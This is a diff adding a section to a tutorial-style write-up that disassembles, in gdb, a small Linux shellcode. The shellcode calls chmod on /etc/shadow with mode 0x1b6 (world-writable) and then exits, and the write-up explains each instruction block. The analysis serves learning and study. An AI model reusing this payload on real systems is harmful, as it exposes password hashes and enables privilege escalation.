@@ -132,4 +132,154 @@ root# ls -l /etc/shadow
 ```
 Great! Our payload works as intended. Now lets set a breakpoint and analyze the shellcode with `gdb`.
 
-## Analyzing the Shellcode with `gdb`
+## Disassembling the Shellcode with `gdb`
++ We will start the program with `gdb`. 
++ We will set a breakpoint for our `shellcode`.
+  - Once control is passed to `shellcode` we will walk through it step by step.
+### Setting up gdb for analysis
+#### Starting the Shellcode with gdb
+```console
+root# gdb ./jmpCallPop
+```
+#### Finding the Memory Location of our Shellcode
+```console
+gdb-peda$ info functions
+All defined functions:
+Non-debugging symbols:
+0x08048060  _start
+0x08048062  decoder
+0x08048063  jmp2_shellcode
+0x08048066  call_shellcode
+0x0804806b  shellcode
+```
+#### Setting the Breakpoint in gdb
+```console
+gdb-peda$ b shellcode
+Breakpoint 1 at 0x804806b
+```
+#### Running & Disassembling the Shellcode 
+```console
+gdb-peda$ run
+gdb-peda$ disassemble $eip
+Dump of assembler code for function shellcode:
+=> 0x0804806b <+0>:     cdq
+   0x0804806c <+1>:     push   0xf
+   0x0804806e <+3>:     pop    eax
+   0x0804806f <+4>:     push   edx
+   0x08048070 <+5>:     call   0x8048081 <shellcode+22>
+   0x08048075 <+10>:    das
+   0x08048076 <+11>:    gs
+   0x08048077 <+12>:    je     0x80480dc
+   0x08048079 <+14>:    das
+   0x0804807a <+15>:    jae    0x80480e4
+   0x0804807c <+17>:    popa
+   0x0804807d <+18>:    outs   dx,DWORD PTR fs:[esi]
+   0x0804807f <+20>:    ja     0x8048081 <shellcode+22>
+   0x08048081 <+22>:    pop    ebx
+   0x08048082 <+23>:    push   0x1b6
+   0x08048087 <+28>:    pop    ecx
+   0x08048088 <+29>:    int    0x80
+   0x0804808a <+31>:    push   0x1
+   0x0804808c <+33>:    pop    eax
+   0x0804808d <+34>:    int    0x80
+End of assembler dump.
+```
++ Great! Now we will break these instructions into systemcall sections and then disect them block by block.
+
+## Dividing the Shellcode by Systemcalls
+Since we know that the instruction `int 0x80` is used to execute linux systemcalls, we will use this knowlege to divid this shellcode into two sections.  
+We also know that the value of the `eax` register controls which systemcall will be executed.  
++ Our first systemcall has the eax value of `0xf`.
++ Our second systemcall has the eax value of `0x1`.
+
+### chmod Systemcall Section
++ The hex value `0xf` translates to `15` in decimal.
+#### Finding the Systemcall in the Header File
+
+```console
+i /usr/include/i386-linux-gnu/asm/unistd_32.h
+  #define __NR_chmod               15
+```
+#### chmod C Function
++ The corresonding assembly register values have been tagged onto the C function.
+
+```console
+root# man 2 chmod
+  int chmod(const char *path, mode_t mode);
+       EAX         EBX             ECX
+```
+### chmod Broken Down by Blocks
+#### First Block 
+```console
+=> 0x0804806b <+0>:     cdq
+   0x0804806c <+1>:     push   0xf
+   0x0804806e <+3>:     pop    eax
+   0x0804806f <+4>:     push   edx
+```
+
+1. Instruction `cdq` is used to clear out the `edx` register.
++ `cqd` - Covert Doubleword to Quadword
+  - a Doubleword is 32 bits (one register)
+  - a Quadword   is 64 bits (two registers)
+  - if eax is a positive value, the edx will be clear - `edx: 0x00000000`
+  - if eax is a negiative value, the edx will be full - `edx: 0xffffffff`
+2. Instruction `push 0xf` pushes the byte `0xf` onto the top of the stack.
+3. Instruction `pop eax` puts the value `0xf` into the `eax` register from the top of the `stack`.
++ `EAX: 0xf`
+4. Instruction `push edx` pushes 4 bytes `0x00` (a dword) onto the top of the stack.
+  
+#### Second Block
+This block of code uses the `call` instruction to jump over the block shown here, and continue execution of the shellcode. 
++ When the `call` instruction is executed, the memory location of the next instruction will be stored otno the top of the stack before maing the jump.
++ The memory location stored on the top of the stack is actually the address of our string used for the filename `/etc/shadow`.
+  - Any time I see `das` after a call in shellcode, it typically means it is a string operation.
+```console
+   0x08048070 <+5>:     call   0x8048081 <shellcode+22>
+   0x08048075 <+10>:    das
+   0x08048076 <+11>:    gs
+   0x08048077 <+12>:    je     0x80480dc
+   0x08048079 <+14>:    das
+   0x0804807a <+15>:    jae    0x80480e4
+   0x0804807c <+17>:    popa
+   0x0804807d <+18>:    outs   dx,DWORD PTR fs:[esi]
+   0x0804807f <+20>:    ja     0x8048081 <shellcode+22>
+```
+##### Pointer to /etc/shadow string on the top of the Stack
+```console
+[-------------------stack---------------------------]
+0000| 0xbffff588 --> 0x8048074 (<shellcode+10>: das)
+```
+
+#### Third Block
+This block finishs setting up the registers 
+
+```console
+   0x08048081 <+22>:    pop    ebx
+   0x08048082 <+23>:    push   0x1b6
+   0x08048087 <+28>:    pop    ecx
+   0x08048088 <+29>:    int    0x80
+```
+
+### exit Systemcall Section
++ Our second systemcall had the  hex value `0x1` in the `eax` register.
+#### Finding the Systemcall in the Header File
+
+```console
+root# vi /usr/include/i386-linux-gnu/asm/unistd_32.h
+      #define __NR_exit                 1
+```
+#### exit C Function
++ The corresonding assembly register values have been tagged onto the C function.
+
+```console
+ void _exit(int status);
+       EAX     EBX
+```
+##### Exit Block
+```console
+   0x0804808a <+31>:    push   0x1
+   0x0804808c <+33>:    pop    eax
+   0x0804808d <+34>:    int    0x80
+```
++ before the `exit` systemcall, its number `0x1` is popped into the `eax` register from the `stack`.
++ The value in the `ebx` register doesn't really matter since it is just the exit code number.
